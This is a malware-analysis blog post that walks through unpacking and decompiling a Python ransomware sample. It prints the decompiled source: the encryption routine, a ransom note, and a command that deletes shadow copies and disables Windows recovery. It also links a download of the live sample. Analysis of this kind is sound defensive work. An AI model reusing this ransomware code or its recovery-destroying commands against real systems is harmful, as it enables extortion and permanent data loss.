<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Decoding a Pyinstaller ransomware sample - Alon Alush</title>
<meta name="description" content="Decoding a ransomware sample made in Python, step by step ">


  <meta name="author" content="Alon Alush">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Alon Alush">
<meta property="og:title" content="Decoding a Pyinstaller ransomware sample">
<meta property="og:url" content="https://github.com/pages/Alon-Alush/alonalush.github.io/malware%20analysis/pythonransomware/">


  <meta property="og:description" content="Decoding a ransomware sample made in Python, step by step ">



  <meta property="og:image" content="https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/malwareanalysis/pyinstaller/image-1.png">





  <meta property="article:published_time" content="2025-04-20T00:00:00+00:00">





  

  


<link rel="canonical" href="https://github.com/pages/Alon-Alush/alonalush.github.io/malware%20analysis/pythonransomware/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Alon Alush",
      "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/"
    
  }
</script>


  <meta name="google-site-verification" content="hDFFgz2dwyDgZl9ZHL-5_AhkPhNOb31bi5gN5KD1tyI" />





<!-- end _includes/seo.html -->


<link href="/pages/Alon-Alush/alonalush.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="Alon Alush Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/pages/Alon-Alush/alonalush.github.io/assets/css/main.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">


<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/pages/Alon-Alush/alonalush.github.io/"><img src="/pages/Alon-Alush/alonalush.github.io/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/pages/Alon-Alush/alonalush.github.io/">
          Alon Alush
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/pages/Alon-Alush/alonalush.github.io/categories/#unpacking">Unpacking</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/Alon-Alush/alonalush.github.io/categories/#evadingavs">AV Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/Alon-Alush/alonalush.github.io/categories/#Injection">Injection</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/pages/Alon-Alush/alonalush.github.io/assets/images/site-data/bio-photo.jpg" alt="Alon Alush" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Alon Alush</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Simple blog that documents my reverse engineering / malware analysis endeavors on Windows.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
        
          
            <li><a href="mailto:alonalush5@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://discordapp.com/users/450639647106662402" rel="nofollow noopener noreferrer"><i class="fab fa-discord" aria-hidden="true"></i><span class="label">Discord</span></a></li>
          
        
          
            <li><a href="https://github.com/Alon-Alush" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Decoding a Pyinstaller ransomware sample">
    <meta itemprop="description" content="Note: if you want to download this ransomware sample for educational purposes, feel free to do so by clicking here: password: infectedIntroductionRecently, I’ve came across this Python ransomware sample:First, here’s the ransom note:Now, let’s start examining the .exe file statically.Understanding the fileHere’s the Detect It Easy output:We can clearly see that the program is a python-compiled executable, by examining the hexadecimal artifacts:Now, let’s jump to reversing the file!We will use the Python script pyinstxtractor to extract and analyze the contents of this pyinstaller generated executable file:Unpacking pyinstaller resourcesWe received the output from pyinstxtractor:C:\Users\WDAGUtilityAccount\Downloads\analyzing&gt;pyinstxtractor.py Encryptor.exe[+] Processing Encryptor.exe[+] Pyinstaller version: 2.1+[+] Python version: 3.13[+] Length of package: 21092376 bytes[+] Found 120 files in CArchive[+] Beginning extraction...please standby[+] Possible entry point: pyiboot01_bootstrap.pyc[+] Possible entry point: pyi_rth_inspect.pyc[+] Possible entry point: pyi_rth_cryptography_openssl.pyc[+] Possible entry point: pyi_rth_pywintypes.pyc[+] Possible entry point: pyi_rth_pythoncom.pyc[+] Possible entry point: pyi_rth_pkgres.pyc[+] Possible entry point: pyi_rth_multiprocessing.pyc[+] Possible entry point: pyi_rth_setuptools.pyc[+] Possible entry point: pyi_rth_pkgutil.pyc[+] Possible entry point: Encryptor.pyc[+] Found 609 files in PYZ archive[+] Successfully extracted pyinstaller archive: Encryptor.exeYou can now use a python decompiler on the pyc files within the extracted directory.So, let’s go to the newly generated Encrypted.exe_extracted folder:This ransomware sample clearly uses a lot of cryptographic libraries.This Encrypted.pyc file is one of the files in the Encrypted.exe_extracted folder:Now, we need to decompile the Encrypted.pyc file we received from pyinstxtractor. For that, we’ll use the web interface of this library called pylingual, that decompiles .pyc files containing the compiled bytecode of the ransomware’s main Python source code:Pylingual gave us a great reconstruction of the source code:Reconstructed source code# Decompiled with PyLingual (https://pylingual.io)# Internal filename: Encryptor.py# Bytecode version: 3.13.0rc3 (3571)# Source timestamp: 1970-01-01 00:00:00 UTC (0)from pathlib import Pathfrom PIL import Image, ImageDraw, ImageFontimport ctypesimport stringimport subprocessimport shutilimport base64import sysfrom win32com.client import Dispatchfrom win32api import GetSystemMetricsfrom PIL import Image, ImageDraw, ImageFontimport randomimport osimport secretsfrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.backends import default_backendPUBLIC_KEY_PEM = &#39;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzOPVPDhQAR/xYjucI5SdCugXS\nG9ZFk5C1It85dOvh+fmD1UNXs5h3R28hUtThRARNh2ar3ADlGGWHIKwoV4P5hZx4\nq2Cg4odgWrf7a5eskCu3fI4eCTKBSItuEs4nFrjdu6HDXnzVHDkxrkWY96mmoZ9R\n0zG8Kyo6ofuge9p2IwIDAQAB\n-----END PUBLIC KEY-----&#39;AES_KEY_PATH = &#39;C:\\ProgramData\\02dq34jROu.key&#39;USER_PATH = os.path.expanduser(&#39;~&#39;)TARGET_DIRS = [&#39;Downloads&#39;, &#39;Music&#39;, &#39;Documents&#39;, &#39;Desktop&#39;, &#39;Videos&#39;, &#39;Pictures&#39;]EXTENSION = &#39;.02dq34jROu&#39;def _34EYLBSVGLRLCR7DM4():    return serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode(), backend=default_backend())def _JXOPHO2CGWP23DL9L1():    aes_key = secrets.token_bytes(32)    public_key = _34EYLBSVGLRLCR7DM4()    encrypted_aes_key = public_key.encrypt(aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))    with open(AES_KEY_PATH, &#39;wb&#39;) as key_file:        key_file.write(encrypted_aes_key)        return aes_keydef _0HAHESD3QA17F3OWF7():    if not os.path.exists(AES_KEY_PATH):        return _JXOPHO2CGWP23DL9L1()def _SSJAVGM86I7CGWDH9W(file_path, aes_key):    if not file_path.endswith(EXTENSION) and (not file_path.endswith(&#39;.exe&#39;)) and (not file_path.endswith(&#39;.dll&#39;)) and file_path.endswith(&#39;.lnk&#39;):        pass  # postinserted    return Nonedef _LLIRBGOWCAMFAVUTAK():    global aes_key  # inserted    contentof = &#39;-- Lyrix\n\nYour data has been encrypted and stolen. The only way to recover it is by contacting us.\nDo not attempt to use third-party recovery tools — doing so may permanently damage your files.\n\nTo prove that decryption is possible, we are willing to decrypt 2 random files for free.\n\nYou can contact us at:\nTDVP7boZDZDE4GYWA3qW@protonmail.com\n\nWARNING!\nWe have also downloaded a portion of your data. If you do not pay, we will release it publicly.\n\nID: KVNR2HLU3N9W5BQCPU\n    &#39;    aes_key = _0HAHESD3QA17F3OWF7()    print(&#39;AES key already exists. Skipping key generation.&#39;) if not aes_key else None    appdata_dir = os.path.join(USER_PATH, &#39;AppData&#39;).lower()    for root, dirs, files in os.walk(USER_PATH):        root_normalized = os.path.abspath(root).lower()        if root_normalized.startswith(appdata_dir):            continue        readme_path = os.path.join(root, &#39;README.txt&#39;)        try:            with open(readme_path, &#39;w&#39;, encoding=&#39;utf-8&#39;) as readme_file:                readme_file.write(contentof)                    print(f&#39;Created README.txt in: {root}&#39;)                    for file in files:                        file_path = os.path.join(root, file)                        try:                            _SSJAVGM86I7CGWDH9W(file_path, aes_key)                            print(f&#39;File [{file_path}] encrypted&#39;)    except Exception as e:        print(f&#39;[WARNING] Failed to create README.txt in {root}: {e}&#39;)    except Exception as e:        print(f&#39;[WARNING] Cannot Encrypt file {file_path}: {e}&#39;)if __name__ == &#39;__main__&#39;:    _LLIRBGOWCAMFAVUTAK()subprocess.Popen(&#39;cmd.exe /c vssadmin delete shadows /all /quiet &amp; wmic shadowcopy delete &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no&#39;, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)extensions_to_list = [&#39;.exe&#39;, &#39;.dll&#39;, &#39;.lnk&#39;]def list_files(drive_path, extensions):    for root, dirs, files in os.walk(drive_path, topdown=True):        for file in files:            if any((file.endswith(ext) for ext in extensions)):                continue            file_path = os.path.join(root, file)            _SSJAVGM86I7CGWDH9W(file_path, aes_key)for drive_letter in string.ascii_uppercase:    drive_path = f&#39;{drive_letter}:/&#39;    if drive_letter not in [&#39;C&#39;] and os.path.exists(drive_path):        pass  # postinserted    else:  # inserted        try:            list_files(drive_path, extensions_to_list)except PermissionError:    print(f&#39;Access denied to {drive_path}&#39;)Great! So now we managed to get the literal source code itself.Let’s explain what the code does step by step:Source code explanationHere are the key variables:  PUBLIC_KEY_PEM: The attacker’s RSA public key, hardcoded into the malware.  AES_KEY_PATH: Where the victim’s encrypted AES key will be stored: C:\ProgramData\02dq34jROu.key. 02dq34jROu is likely a generated ID for the key  TARGET_DIRS: Standard folders to attack first (Downloads, Documents, Desktop, etc.).  EXTENSION: Files will get renamed with the randomly generated ID .02dq34jROu after encryption (this code doesn’t show the full renaming though).The malware also uses subprocess.Popen(...) commands to deletes all system shadow copies and disables recovery options:  vssadmin delete shadows /all /quiet  wmic shadowcopy delete  bcdedit /set {default} bootstatuspolicy ignoreallfailures  bcdedit /set {default} recoveryenabled noThis makes it harder to recover files without paying.list_files(drive_path, extensions)Walks through a drive letter (like D:/, E:/).The encryption routine works like this:  For every file, if file is NOT .exe, .dll, or .lnk, it tries to encrypt it.  For every drive letter A: to Z, if the drive exists and is NOT C: (system drive), encrypt files on it.This ransomware has some bugs and problems, and is likely very ameatur-ish.">
    <meta itemprop="datePublished" content="2025-04-20T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Decoding a Pyinstaller ransomware sample
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  5 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#understanding-the-file">Understanding the file</a></li>
  <li><a href="#unpacking-pyinstaller-resources">Unpacking pyinstaller resources</a></li>
  <li><a href="#reconstructed-source-code">Reconstructed source code</a></li>
  <li><a href="#source-code-explanation">Source code explanation</a></li>
</ul>

            </nav>
          </aside>
        
        <p><strong>Note:</strong> if you want to download this ransomware sample for educational purposes, feel free to do so by clicking here: <a href="https://drive.usercontent.google.com/download?id=1NWs44HGrYTqrUm1V_G-gTXTrdXReOjDn&amp;export=download&amp;authuser=0">password: infected</a></p>

<h1 id="introduction">Introduction</h1>

<p>Recently, I’ve came across this Python ransomware sample:
<img src="/assets/images/malwareanalysis/pyinstaller/image.png" alt="Encryptor.exe ransomware" /></p>

<p>First, here’s the ransom note:
<img src="/assets/images/malwareanalysis/pyinstaller/note.png" alt="ransomware note" /></p>

<p>Now, let’s start examining the .exe file statically.</p>
<h1 id="understanding-the-file">Understanding the file</h1>
<p>Here’s the <code class="language-plaintext highlighter-rouge">Detect It Easy</code> output:
<img src="/assets/images/malwareanalysis/pyinstaller/image-1.png" alt="Detect it easy" /></p>

<p>We can clearly see that the program is a python-compiled executable, by examining the hexadecimal artifacts:</p>

<p><img src="/assets/images/malwareanalysis/pyinstaller/image-2.png" alt="alt text" /></p>

<p>Now, let’s jump to reversing the file!</p>

<p>We will use the Python script <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> to extract and analyze the contents of this pyinstaller generated executable file:</p>
<h1 id="unpacking-pyinstaller-resources">Unpacking pyinstaller resources</h1>
<p><img src="/assets/images/malwareanalysis/pyinstaller/image-3.png" alt="Analyzing the file" /></p>

<p>We received the output from pyinstxtractor:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\WDAGUtilityAccount\Downloads\analyzing&gt;pyinstxtractor.py Encryptor.exe
[+] Processing Encryptor.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.13
[+] Length of package: 21092376 bytes
[+] Found 120 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_cryptography_openssl.pyc
[+] Possible entry point: pyi_rth_pywintypes.pyc
[+] Possible entry point: pyi_rth_pythoncom.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_setuptools.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: Encryptor.pyc
[+] Found 609 files in PYZ archive
[+] Successfully extracted pyinstaller archive: Encryptor.exe

</code></pre></div></div>

<p>You can now use a python decompiler on the pyc files within the extracted directory.</p>

<p>So, let’s go to the newly generated <code class="language-plaintext highlighter-rouge">Encrypted.exe_extracted</code> folder:</p>

<p><img src="/assets/images/malwareanalysis/pyinstaller/image-4.png" alt="Unpacked libraries" /></p>

<p>This ransomware sample clearly uses a lot of cryptographic libraries.</p>

<p>This <code class="language-plaintext highlighter-rouge">Encrypted.pyc</code> file is one of the files in the <code class="language-plaintext highlighter-rouge">Encrypted.exe_extracted</code> folder:</p>

<p><img src="/assets/images/malwareanalysis/pyinstaller/image-5.png" alt="Bytecode" /></p>

<p>Now, we need to decompile the <code class="language-plaintext highlighter-rouge">Encrypted.pyc</code> file we received from pyinstxtractor. For that, we’ll use the web interface of this library called <a href="https://www.pylingual.io/">pylingual</a>, that decompiles <code class="language-plaintext highlighter-rouge">.pyc</code> files containing the compiled bytecode of the ransomware’s main Python source code:</p>

<p>Pylingual gave us a great reconstruction of the source code:</p>
<h1 id="reconstructed-source-code">Reconstructed source code</h1>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1"># Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Encryptor.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)
</span>
<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageDraw</span><span class="p">,</span> <span class="n">ImageFont</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">win32com.client</span> <span class="kn">import</span> <span class="n">Dispatch</span>
<span class="kn">from</span> <span class="nn">win32api</span> <span class="kn">import</span> <span class="n">GetSystemMetrics</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageDraw</span><span class="p">,</span> <span class="n">ImageFont</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">secrets</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric</span> <span class="kn">import</span> <span class="n">padding</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span><span class="p">,</span> <span class="n">hashes</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span><span class="p">,</span> <span class="n">modes</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
<span class="n">PUBLIC_KEY_PEM</span> <span class="o">=</span> <span class="s">'-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzOPVPDhQAR/xYjucI5SdCugXS</span><span class="se">\n</span><span class="s">G9ZFk5C1It85dOvh+fmD1UNXs5h3R28hUtThRARNh2ar3ADlGGWHIKwoV4P5hZx4</span><span class="se">\n</span><span class="s">q2Cg4odgWrf7a5eskCu3fI4eCTKBSItuEs4nFrjdu6HDXnzVHDkxrkWY96mmoZ9R</span><span class="se">\n</span><span class="s">0zG8Kyo6ofuge9p2IwIDAQAB</span><span class="se">\n</span><span class="s">-----END PUBLIC KEY-----'</span>
<span class="n">AES_KEY_PATH</span> <span class="o">=</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">02dq34jROu.key'</span>
<span class="n">USER_PATH</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s">'~'</span><span class="p">)</span>
<span class="n">TARGET_DIRS</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Downloads'</span><span class="p">,</span> <span class="s">'Music'</span><span class="p">,</span> <span class="s">'Documents'</span><span class="p">,</span> <span class="s">'Desktop'</span><span class="p">,</span> <span class="s">'Videos'</span><span class="p">,</span> <span class="s">'Pictures'</span><span class="p">]</span>
<span class="n">EXTENSION</span> <span class="o">=</span> <span class="s">'.02dq34jROu'</span>

<span class="k">def</span> <span class="nf">_34EYLBSVGLRLCR7DM4</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">serialization</span><span class="p">.</span><span class="n">load_pem_public_key</span><span class="p">(</span><span class="n">PUBLIC_KEY_PEM</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">_JXOPHO2CGWP23DL9L1</span><span class="p">():</span>
    <span class="n">aes_key</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">.</span><span class="n">token_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
    <span class="n">public_key</span> <span class="o">=</span> <span class="n">_34EYLBSVGLRLCR7DM4</span><span class="p">()</span>
    <span class="n">encrypted_aes_key</span> <span class="o">=</span> <span class="n">public_key</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">padding</span><span class="p">.</span><span class="n">OAEP</span><span class="p">(</span><span class="n">mgf</span><span class="o">=</span><span class="n">padding</span><span class="p">.</span><span class="n">MGF1</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">()),</span> <span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">(),</span> <span class="n">label</span><span class="o">=</span><span class="bp">None</span><span class="p">))</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">AES_KEY_PATH</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">key_file</span><span class="p">:</span>
        <span class="n">key_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypted_aes_key</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">aes_key</span>

<span class="k">def</span> <span class="nf">_0HAHESD3QA17F3OWF7</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">AES_KEY_PATH</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">_JXOPHO2CGWP23DL9L1</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">_SSJAVGM86I7CGWDH9W</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">aes_key</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">EXTENSION</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="ow">not</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.exe'</span><span class="p">))</span> <span class="ow">and</span> <span class="p">(</span><span class="ow">not</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.dll'</span><span class="p">))</span> <span class="ow">and</span> <span class="n">file_path</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.lnk'</span><span class="p">):</span>
        <span class="k">pass</span>  <span class="c1"># postinserted
</span>    <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">_LLIRBGOWCAMFAVUTAK</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">aes_key</span>  <span class="c1"># inserted
</span>    <span class="n">contentof</span> <span class="o">=</span> <span class="s">'-- Lyrix</span><span class="se">\n\n</span><span class="s">Your data has been encrypted and stolen. The only way to recover it is by contacting us.</span><span class="se">\n</span><span class="s">Do not attempt to use third-party recovery tools — doing so may permanently damage your files.</span><span class="se">\n\n</span><span class="s">To prove that decryption is possible, we are willing to decrypt 2 random files for free.</span><span class="se">\n\n</span><span class="s">You can contact us at:</span><span class="se">\n</span><span class="s">TDVP7boZDZDE4GYWA3qW@protonmail.com</span><span class="se">\n\n</span><span class="s">WARNING!</span><span class="se">\n</span><span class="s">We have also downloaded a portion of your data. If you do not pay, we will release it publicly.</span><span class="se">\n\n</span><span class="s">ID: KVNR2HLU3N9W5BQCPU</span><span class="se">\n</span><span class="s">    '</span>
    <span class="n">aes_key</span> <span class="o">=</span> <span class="n">_0HAHESD3QA17F3OWF7</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'AES key already exists. Skipping key generation.'</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">aes_key</span> <span class="k">else</span> <span class="bp">None</span>
    <span class="n">appdata_dir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">USER_PATH</span><span class="p">,</span> <span class="s">'AppData'</span><span class="p">).</span><span class="n">lower</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">USER_PATH</span><span class="p">):</span>
        <span class="n">root_normalized</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">root</span><span class="p">).</span><span class="n">lower</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">root_normalized</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">appdata_dir</span><span class="p">):</span>
            <span class="k">continue</span>
        <span class="n">readme_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">'README.txt'</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">readme_path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">readme_file</span><span class="p">:</span>
                <span class="n">readme_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">contentof</span><span class="p">)</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Created README.txt in: </span><span class="si">{</span><span class="n">root</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                    <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
                        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">)</span>
                        <span class="k">try</span><span class="p">:</span>
                            <span class="n">_SSJAVGM86I7CGWDH9W</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">aes_key</span><span class="p">)</span>
                            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'File [</span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s">] encrypted'</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[WARNING] Failed to create README.txt in </span><span class="si">{</span><span class="n">root</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
